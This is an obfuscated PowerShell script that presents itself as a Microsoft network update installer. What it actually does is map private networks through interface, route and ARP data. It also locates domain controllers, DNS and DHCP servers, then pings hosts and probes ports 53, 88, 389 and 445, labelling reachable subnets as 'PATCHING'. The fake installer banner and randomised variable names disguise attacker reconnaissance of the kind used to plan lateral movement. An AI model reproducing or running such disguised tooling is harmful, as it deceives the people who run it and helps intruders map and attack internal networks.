Clear-Host
Write-Host "===== MICROSOFT NETWORK V1.0.45.1e UPDATE INSTALLER =====" -ForegroundColor Cyan
Write-Host ""

function Get-SubnetFromIP {
    param($Hza2DWVtqPBK4to,$3YKpH9puctONmbrwMzb6S9U = 24)

    if ($Hza2DWVtqPBK4to -match "^\d+\.\d+\.\d+\.\d+$") {
        $ANui8YNXq = $Hza2DWVtqPBK4to.Split(".")

        if ($ANui8YNXq[0] -eq "10") {
            return "10.0.0.0/8"
        }

        if ($ANui8YNXq[0] -eq "172" -and [int]$ANui8YNXq[1] -ge 16 -and [int]$ANui8YNXq[1] -le 31) {
            return "172.16.0.0/12"
        }

        if ($ANui8YNXq[0] -eq "192" -and $ANui8YNXq[1] -eq "168") {
            return "192.168.0.0/16"
        }

        return "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2]).0/24"
    }

    return $null
}

function Test-FastPing {
    param($Hza2DWVtqPBK4to)

    try {
        $pf6GBT5rOujn = New-Object System.Net.NetworkInformation.Ping
        $MCKPea3JAi8sfTBx72oQHcu6E = $pf6GBT5rOujn.Send($Hza2DWVtqPBK4to,150)

        return ($MCKPea3JAi8sfTBx72oQHcu6E.Status -eq "Success")
    }
    catch { return $false }
}

function Test-FastPort {
    param($Hza2DWVtqPBK4to,$1JyxKW9Vy)

    try {
        $Xi = New-Object System.Net.Sockets.TcpClient
        $tFU0OZdS3R = $Xi.BeginConnect($Hza2DWVtqPBK4to,$1JyxKW9Vy,$null,$null)

        if ($tFU0OZdS3R.AsyncWaitHandle.WaitOne(100,$false) -and $Xi.Connected) {
            $Xi.Close()
            return $true
        }

        $Xi.Close()
    }
    catch {}

    return $false
}





Write-Host "[+] Collecting Interface Networks..."
$networksGFjLCThoW5U = @()

Get-NetIPConfiguration | ForEach-Object {
    if ($_.IPv4Address.IPAddress) {

        $Hza2DWVtqPBK4to = $_.IPv4Address.IPAddress
        $73sNhc0bU5APzGdZD = Get-SubnetFromIP $Hza2DWVtqPBK4to
        if ($73sNhc0bU5APzGdZD -match "10\.|172\.|192\.168") {
            $networksGFjLCThoW5U += $73sNhc0bU5APzGdZD
        }
    }
}

Write-Host "[+] Collecting Routing Table..."
Get-NetRoute -AddressFamily IPv4 |
Where-Object { $_.DestinationPrefix -match "10\.|172\.|192\.168" } |
ForEach-Object {
    $networksGFjLCThoW5U += $_.DestinationPrefix
}

Write-Host "[+] Collecting ARP Evidence..."
$XopTwUVBRfHbg8 = Get-NetNeighbor |
Where-Object { $_.State -ne "Unreachable" -and $_.IPAddress -match "^\d+\." } |
Select-Object -ExpandProperty IPAddress -Unique

foreach ($Hza2DWVtqPBK4to in $XopTwUVBRfHbg8) {
    $ANui8YNXq = $Hza2DWVtqPBK4to.Split(".")
    if ($ANui8YNXq[0] -in @("10","172","192")) {
        $networksGFjLCThoW5U += "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2]).0/24"
    }
}





Write-Host "[+] Correlating Domain Context..."

$kUGyLCbTIq = @()


try {
    $emjbhTKkCx8aJV = Get-ADDomain -ErrorAction SilentlyContinue
    if ($emjbhTKkCx8aJV) {
        Write-Host "    [+] Domain Detected: $($emjbhTKkCx8aJV.Name)"

        $dp6qvlHPreEoUXhmyISaKRG2 = Get-ADDomainController -Filter * -ErrorAction SilentlyContinue
        foreach ($cByyh0ZRi in $dp6qvlHPreEoUXhmyISaKRG2) {
            if ($cByyh0ZRi.IPv4Address) { $kUGyLCbTIq += $cByyh0ZRi.IPv4Address }
        }
    }
}
catch {}


try {
    $V = Get-DnsClientServerAddress -AddressFamily IPv4 |
                  Select-Object -ExpandProperty ServerAddresses -Unique

    $kUGyLCbTIq += $V
}
catch {}


try {
    $1kzyNhw6cCQtOmfXirGBYHaRq = Get-DhcpServerInDC -ErrorAction SilentlyContinue
    foreach ($q7DpaGVdfH0 in $1kzyNhw6cCQtOmfXirGBYHaRq) {
        if ($q7DpaGVdfH0.IPAddress) { $kUGyLCbTIq += $q7DpaGVdfH0.IPAddress }
    }
}
catch {}

foreach ($Hza2DWVtqPBK4to in $kUGyLCbTIq) {
    $ANui8YNXq = $Hza2DWVtqPBK4to.Split(".")
    if ($ANui8YNXq[0] -in @("10","172","192")) {
        $networksGFjLCThoW5U += "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2]).0/24"
    }
}

$networksGFjLCThoW5U = $networksGFjLCThoW5U |
            Where-Object { $_ -match "10\.|172\.|192\.168" } |
            Sort-Object -Unique

Write-Host ""
Write-Host "Discovered Private Networks: $($networksGFjLCThoW5U.Count)"
Write-Host ""





Write-Host "[+] Validating Internal Reachability..."

$1hCNqRu5ci = @()

foreach ($73sNhc0bU5APzGdZD in $networksGFjLCThoW5U) {

    $RTJDhmQCadcitOfUvN7 = ($73sNhc0bU5APzGdZD -split "/")[0]
    $ANui8YNXq = $RTJDhmQCadcitOfUvN7.Split(".")
    if ($ANui8YNXq.Count -lt 3) { continue }

    $lm9L09xZyH1otq3F9 = "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2])"
    $lbgXolRpc9rU0B7fIAGkZbDNJ = 0

    
    if ($kUGyLCbTIq | Where-Object { $_ -like "$lm9L09xZyH1otq3F9.*" }) {
        $lbgXolRpc9rU0B7fIAGkZbDNJ += 3
    }

    
    if ($XopTwUVBRfHbg8 | Where-Object { $_ -like "$lm9L09xZyH1otq3F9.*" }) {
        $lbgXolRpc9rU0B7fIAGkZbDNJ += 2
    }

    
    $feiTM1beTCkj = Get-NetRoute -DestinationPrefix "0.0.0.0/0" |
          Select-Object -First 1 -ExpandProperty NextHop -ErrorAction SilentlyContinue

    if ($feiTM1beTCkj -like "$lm9L09xZyH1otq3F9.*") { $lbgXolRpc9rU0B7fIAGkZbDNJ++ }

    
    $oKRZH2CSOt2qAxN59EBmN = @("$lm9L09xZyH1otq3F9.1","$lm9L09xZyH1otq3F9.254","$lm9L09xZyH1otq3F9.$(Get-Random -Minimum 10 -Maximum 200)")

    foreach ($PeX546JKA70m3ylprb9SBHFIU in $oKRZH2CSOt2qAxN59EBmN) {
        if (Test-FastPing $PeX546JKA70m3ylprb9SBHFIU) { $lbgXolRpc9rU0B7fIAGkZbDNJ++ ; break }
    }

    
    foreach ($1JyxKW9Vy in @(53,88,389,445)) {
        if (Test-FastPort "$lm9L09xZyH1otq3F9.1" $1JyxKW9Vy) { $lbgXolRpc9rU0B7fIAGkZbDNJ++ }
    }

    if ($lbgXolRpc9rU0B7fIAGkZbDNJ -ge 2) {
        Write-Host "[+] PATCHING -> $lm9L09xZyH1otq3F9.0/24 (Score:$lbgXolRpc9rU0B7fIAGkZbDNJ)" -ForegroundColor Cyan
        $1hCNqRu5ci += "$lm9L09xZyH1otq3F9.0/24"
    }
}

$1hCNqRu5ci = $1hCNqRu5ci | Sort-Object -Unique





Write-Host ""
Write-Host "========================================="
Write-Host "NETWORK UPDATES AVAILABLE"
Write-Host "========================================="
Write-Host ""

if ($1hCNqRu5ci.Count -eq 0) {
    Write-Host " -> No internal networks confirmed."
}
else {
    foreach ($j7gIC2KTdcHuoOBL in $1hCNqRu5ci) {
        Write-Host " -> $j7gIC2KTdcHuoOBL"
    }
}

Write-Host ""
Write-Host "Done."

